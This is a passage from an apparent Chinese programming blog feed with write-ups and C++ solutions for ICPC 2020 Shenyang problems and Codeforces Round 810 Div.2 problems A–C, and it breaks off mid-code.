<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        sum2[i]=sum2[i<span class="number">-1</span>]+a[i].value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(sum1[i]==sum2[i])&#123;</span><br><span class="line">            ans++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//cin&gt;&gt;t;</span></span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="G-The-Witchwood"><a href="#G-The-Witchwood" class="headerlink" title="G. The Witchwood"></a>G. The Witchwood</h1><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/25/2020%E6%B2%88%E9%98%B3icpc%E5%A4%8D%E7%9B%98/3.png" alt="3"></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>签到，也没啥好说的，就是加出前k大的数。</p><h3 id="标程-2"><a href="#标程-2" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> inf = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line"><span class="keyword">int</span> n, m, t, res = inf;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1050</span>;</span><br><span class="line"><span class="keyword">int</span> a[N];</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n, k;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; k;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">        cin &gt;&gt; a[i];</span><br><span class="line">    <span class="built_in">sort</span>(a + <span class="number">1</span>, a + n + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = n; i &gt;= n - k + <span class="number">1</span>; i--)</span><br><span class="line">        sum += a[i];</span><br><span class="line">    cout &lt;&lt; sum;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="K-Scholomance-Academy"><a href="#K-Scholomance-Academy" class="headerlink" title="K.Scholomance Academy"></a>K.Scholomance Academy</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/25/2020%E6%B2%88%E9%98%B3icpc%E5%A4%8D%E7%9B%98/4.png" alt="4"></p><p>题目描述比较长，也不截全了。</p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>这题是题是题面巨长，但是答案巨简单的一题，讲的是一个机器学习的问题。我们只需要设置 <code>θ</code> 的值扫过去，然后积分算面积即可，没有用到啥算法。</p><h3 id="标程-3"><a href="#标程-3" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> endl <span class="meta-string">&quot;\n&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1e6</span> + <span class="number">10</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">V</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> op;</span><br><span class="line">    <span class="keyword">int</span> v;</span><br><span class="line">&#125; a[N];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">int</span> n, tn, fn, tp, fp;</span><br><span class="line"><span class="keyword">double</span> ans, preX;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(V&amp; a, V&amp; b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a.v == b.v)</span><br><span class="line">        <span class="keyword">return</span> a.op &lt; b.op;</span><br><span class="line">    <span class="keyword">return</span> a.v &lt; b.v;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        cin &gt;&gt; a[i].op &gt;&gt; a[i].v;</span><br><span class="line">        <span class="keyword">if</span> (a[i].op == <span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">            fn++;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            tn++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(a + <span class="number">1</span>, a + n + <span class="number">1</span>, cmp);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = n; i &gt;= <span class="number">1</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">if</span> (a[i].op == <span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">            tp++, fn--;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            fp++, tn--;</span><br><span class="line">        ans += <span class="number">1.0</span> * tp / (tp + fn) * (<span class="number">1.0</span> * fp / (tn + fp) - preX);</span><br><span class="line">        preX = <span class="number">1.0</span> * fp / (tn + fp);</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">setprecision</span>(<span class="number">10</span>) &lt;&lt; fixed &lt;&lt; ans &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="题意分析"><a href="#题意分析" class="headerlink" title="题意分析"></a>题意分析</h3><p>题意： 一个时钟，时针走一圈就是一天，现在给定时针走一圈要 $H$ 小时，分针走一圈要 $M$ 分钟，设 $α=\frac{2πA}{HM}$，求一天中时针和分针夹角小于等于 $α$ 的时刻有几次。</p><p>这题首先有如下几个注意点：<br>①分针是按照刻度一格一格走的，因此不能将小数的分钟算入，必须是整的（即不能按照角度来求）。<br>②两者成角度会有两种情况，分针在时针左边成角度 or 在时针右边成角度</p><p><img src="/2022/07/25/2020%E6%B2%88%E9%98%B3icpc%E5%A4%8D%E7%9B%98/5.png" alt="5"></p><p><strong>切入点：</strong> 一般会最先想到用追及问题的角度去做，但是这样就有两个变量（涉及到分针和时针两个对象），所以我们可以选择将<strong>时针作为参照物</strong> （参照物静止不动），运用相对速度只对分针这一个对象做分析。</p><p>两者绝对速度： $v_{h绝对}= \frac{2π}{HM}$ ，$ v_{m绝对}=\frac{2π}{M}$</p><p>分针相对速度： $v_{m相对}=v_{m绝对}-v_{h绝对}=\frac{2π}{HM}*(H-1)=(H-1)v_{h绝对}$</p><p>即分针相对于时针以 $H−1/min$ 的恒定速度运动。</p><p>要使两者之间夹角小于等于α，也就相当于追及问题中的两针“路程差”≤α，而此处因为时针作为参照物了，所以也就转化成了分针的“路程”$≤α=\frac{2πA}{HM}=A*v_{h绝对}$ </p><p>因此我们可以写出一个关于时间 $t∈[0,HM)$ 的不等式：</p><p>$t\times (H-1)v_{h绝对}\ mod\ HM ≤ |α|=|A∗ v h 绝 对 *v_{h绝对}∗v $</p><p>$t\times (H-1)\ mod\ HM\le |A|$</p><p>根据<strong>剩余系定理三：</strong><br>“若a,b,c为任意3个整数，m为正整数，且（m,c)=1，则当ac≡bc(mod m）时，有a≡b(mod m)”</p><p>所以为了满足互质，可将不等式两边同除以 $g =\gcd(H-1,HM)$  ，不等式可等价为：</p><p>$t\times \frac{H-1}{g}\ mod\ \frac{HM}{g} \le |\frac{A}{g}|$</p><p>$\frac{-A}{g}\le t\times \frac{H-1}{g}\ mod\ \frac{HM}{g}\le \frac{A}{g}$</p><p>————注意：此处t的取值范围也同时从 $[ 0 , HM )$ 缩小到 $[ 0,\frac{HM}{g})$ —————</p><p>下面就只需求解出 t 的整数解的个数，即为满足条件的时刻的次数。我画在数轴上会比较直观。只需求出正半轴有几个整数解，然后个数 $\times 2$并且加上零解。</p><p><img src="/2022/07/25/2020%E6%B2%88%E9%98%B3icpc%E5%A4%8D%E7%9B%98/6.png" alt="6"></p><p>正半轴：因为要mod之后余数$≤\frac{A}{g}$，因此一共有余数为$1，2，3…\frac{A}{g} $ 的共计 $\frac{A}{g}$ 个解，并且这些解中没有重复的，即t的值与余数取值一 一对应，下证：</p><p>令$a=\frac{H-1}{g}$ ，$b=\frac{HM}{g} $</p><p>假设存在$t_1$和$t_2$ 两个不同的值满足：$t_1\times\ mod\ b ≡ t_2\times a\ mod\ b$ 且 $t ∈ [ 0 , b ]$  因此根据同余定义，易证$t_1=t_2$ 与假设矛盾，因此每个t的解所对应的余数一定是各不相同的。</p><p>所以在 $t∈[ 0 , \frac{HM}{g} )$ 的范围内一共有 $2\times (\frac{A}{g})+1$个不同整数解。把范围还原到 $ [ 0 , HM ) $，就共有 $g\times[2\times(\frac{A}g)+1]$ 个不同的整数解，也就是本题答案之一。</p><p>有一种情况需要特判，就是当 $A=\frac{HM}{2}$，这时 $α=π$ ，$t ∈ [ 0 , HM )$ 中的每个整数都满足条件，故答案为 $HM$</p><h3 id="标程-4"><a href="#标程-4" class="headerlink" title="标程"></a>标程</h3><p>然后标程就巨短</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ll long long</span></span><br><span class="line">ll h,m,a;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lld%lld%lld&quot;</span>,&amp;h,&amp;m,&amp;a);</span><br><span class="line">    ll g=__gcd(h<span class="number">-1</span>,h*m);</span><br><span class="line">    <span class="keyword">if</span>(a==h*m/<span class="number">2</span>)  <span class="built_in">printf</span>(<span class="string">&quot;%lld&quot;</span>,h*m);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;%lld&quot;</span>,g*(<span class="number">2</span>*(a/g)+<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//559C6B224E004E2A4EBA662F8FD979CD611F89C95417FF1F</span></span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>希望能和sigma姐姐一起进步，争取下次能vp到铜首水平。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;和sigma姐姐vp这场icpc。&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="vp" scheme="http://example.com/categories/icpc/vp/"/>
    
    <category term="2020沈阳" scheme="http://example.com/categories/icpc/vp/2020%E6%B2%88%E9%98%B3/"/>
    
    
  </entry>
  
  <entry>
    <title>Codeforces Round 810(Div.2)解析</title>
    <link href="http://example.com/2022/07/25/Codeforces%20Round%20810(Div.2)/"/>
    <id>http://example.com/2022/07/25/Codeforces%20Round%20810(Div.2)/</id>
    <published>2022-07-24T17:00:00.000Z</published>
    <updated>2022-07-24T18:19:54.930Z</updated>
    
    <content type="html"><![CDATA[<p>这场打回来一点吧，只是看隔壁div1好像被喷烂了的样子，咱也不懂，也没资格打div1，很多细节没注意到送出去罚时就很难受，本场录屏在B站了，</p><span id="more"></span><h2 id="A-Perfect-Permutation"><a href="#A-Perfect-Permutation" class="headerlink" title="A. Perfect Permutation"></a>A. Perfect Permutation</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/25/Codeforces%20Round%20810(Div.2)/1.png" alt="1"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>这题题意看了我有点久，就是构造一串能使得 <code>a[i]/i</code> 为整数比较少的序列，那么 <code>i=1</code> 它可以被任意数整除。但是 <code>i&gt;1</code> 我总能找到不能整除的数，因此这里构造的序列就是，第一个给 <code>n</code>，后面的给 <code>i-1</code> 即可。</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="keyword">int</span> dp[maxn],sum1[maxn],sum2[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,n);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,i);</span><br><span class="line">&#125;<span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line"><span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">cin&gt;&gt;t;</span><br><span class="line"><span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Party"><a href="#B-Party" class="headerlink" title="B. Party"></a>B. Party</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/25/Codeforces%20Round%20810(Div.2)/2.png" alt="2"></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>这个题目比较有意思，出的也挺好的感觉，虽然一开始可能题意有点没读懂。有n个人，m对关系，如果每个人如果没来就会产生 $a_i$ 的不开心度，如果来了一对朋友那这对朋友要消耗一个蛋糕，一次只能生产偶数个蛋糕不能浪费。那么很显然，如果关系本身就是偶数对，那么所有人都可以来。如果关系是奇数对，我就得考虑踢人了，踢掉一个人的情况，使奇数对变成偶数对的方式就是，这个人有奇数对关系，那么踢了这个人就少了奇数对关系，结果变成偶数对了。踢掉两个人的情况，如果所有人的关系数都是奇数对或者本身踢掉两个人比踢掉一个人产生不开心指数更多，我就要考虑后面的情况了。那么我如果要踢掉两个人，那么这两个人一定都有偶数对关系，因为但凡有一个奇数对关系我都可以只踢掉那个人而保留下来另一个，显然这样的作法比较优。那么踢掉的两个人都是偶数对关系怎么办呢？如果它们自己产生了一对关系，那么两个人的偶数关系发生一个关系的重合，总体下来就是奇数对关系了。那么我们就需要踢掉两个朋友关系的，开心指数较小的两个人。</p><p>然后min一下即可。</p><h3 id="标程-1"><a href="#标程-1" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> b[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="keyword">int</span> dp[maxn],sum1[maxn],sum2[maxn];</span><br><span class="line"><span class="keyword">int</span> table[maxn];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> v;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">&#125;a[maxn];</span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt;G[maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(eee a,eee b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a.v&lt;b.v;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123; </span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i].v);</span><br><span class="line">a[i].i=i;</span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt;().<span class="built_in">swap</span>(G[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">sort</span>(a+<span class="number">1</span>,a+<span class="number">1</span>+n,cmp);</span><br><span class="line"><span class="comment">//puts(&quot;1&quot;);</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">table[a[i].i]=i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> x,y;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;x,&amp;y);</span><br><span class="line">G[table[x]].<span class="built_in">push_back</span>(table[y]);</span><br><span class="line">G[table[y]].<span class="built_in">push_back</span>(table[x]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(m%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">m=<span class="number">1e9</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="comment">//printf(&quot;i=%d\n&quot;,i);</span></span><br><span class="line"><span class="comment">//printf(&quot;%d has %d\n&quot;,a[i].i,G[i].size());</span></span><br><span class="line"><span class="keyword">if</span>(G[i].<span class="built_in">size</span>()%<span class="number">2</span>)&#123;</span><br><span class="line">m=a[i].v;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i].v&gt;m)<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> x=G[i].<span class="built_in">begin</span>();x!=G[i].<span class="built_in">end</span>();x++)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i].v+a[*x].v&lt;m)&#123;</span><br><span class="line"><span class="keyword">if</span>(G[i].<span class="built_in">size</span>()%<span class="number">2</span>==<span class="number">0</span>&amp;&amp;G[*x].<span class="built_in">size</span>()%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">m=a[i].v+a[*x].v;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,m);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line"><span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">cin&gt;&gt;t;</span><br><span class="line"><span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Color-the-Picture"><a href="#C-Color-the-Picture" class="headerlink" title="C. Color the Picture"></a>C. Color the Picture</h2><h2 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h2><p><img src="/2022/07/25/Codeforces%20Round%20810(Div.2)/3.png" alt="3"></p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>这题也还挺好的，就是刷格子，然后要求一每个格子响铃格子都至少有三块相同色块，那么就是说你最多只有一个不同色块的相邻，并且告诉你了怎么处理边界的色块。那么它下面展示的图其实还是比较生动的，就是刷两列或者两行，然后再刷两列两列，如此往复。当然，三列四列都可以，一列是不行的，因为左右就有两个不同颜色的色块了。</p><p>那么我们直接每行每列看看能不能放的出对应的行或者列数即可。但是这里需要特判，如果我们都只能放两列，但是却只有奇数列，这种情况是不行的！！</p><p>最后不开 <code>long long</code> 见祖宗，万事给我加上一句<code>#define int long long</code>。</p><h3 id="标程-2"><a href="#标程-2" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn],c[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> n,m,k;</span><br><span class="line"><span class="keyword">int</span> 